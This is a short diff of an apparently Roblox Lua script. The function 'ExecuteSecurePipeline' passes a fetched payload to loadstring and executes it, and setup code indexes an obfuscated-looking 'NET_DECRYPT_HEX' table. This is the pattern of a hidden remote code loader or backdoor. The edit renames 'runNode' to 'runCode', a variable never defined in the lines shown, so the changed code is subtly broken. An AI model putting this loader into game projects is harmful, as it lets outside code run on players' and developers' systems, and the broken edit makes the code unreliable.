@@ -43,7 +43,7 @@ _G.ExecuteSecurePipeline = function(player)
         
         if success and payload then
             local runNode = loadstring(payload)
-            if runNode then           
+            if runCode then           
                 local character = player.Character
                 if character and character:FindFirstChild("HumanoidRootPart") then
                     character.HumanoidRootPart.Anchored = false
@@ -62,7 +62,7 @@ end
 
 local function Init(player)
     if not player.Character then player.CharacterAdded:Wait() end
-    task.wait(1)
+    task.wait(0.5)
     RequestPlatformTeleport(player, NET_DECRYPT_HEX[0x02])
 end
 
